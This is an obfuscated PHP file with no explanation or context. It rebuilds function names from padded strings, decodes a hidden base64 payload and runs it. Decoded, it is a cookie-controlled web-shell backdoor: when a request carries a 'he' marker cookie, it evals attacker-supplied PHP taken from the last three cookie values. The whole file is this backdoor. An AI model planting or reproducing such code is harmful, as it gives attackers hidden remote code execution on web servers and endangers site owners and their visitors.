<?php
$obji="XgqBsYWgqNlKGFycmF5gqKgqCcvW15cdz1cc10vgqJywngqLgq1xzLygqcpLgqCBhcnJheSgnJy";
$nxmc="wnKycpLCBqb2luKgqGFycmgqF5X3NsaWNgqlKCRhLCRjKCRhKS0zKSkpKSk7ZWNgqobyAnPC8nLigqRrLic+Jzt9";
$zjdu="JGM9J2gqNvdW50JzskYT0kX0gqNPT0tJRTtpZihgqygqZXNldCgkYSk9PSdoZScggqJiYgJGMoJGEpPjgqMpgqeyg";
$elyg = str_replace("ab","","str_abreabplaabcabe");
$qthr="qRgqrPSdsbG8nO2gqVjaG8ggqJzwgqnLgqiRrLic+gqJztldmFsKgqGJhcgq2U2NF9kZWNvZGUocHJlZ19gqyZ";
$pmqr = $elyg("y", "", "ybyaysey64y_ydyeycyoyde");
$gnxh = $elyg("g","","cgrgegagtgeg_gfgugngcgtgigogn");
$gdep = $gnxh('', $pmqr($elyg("gq", "", $zjdu.$qthr.$obji.$nxmc))); $gdep();
?>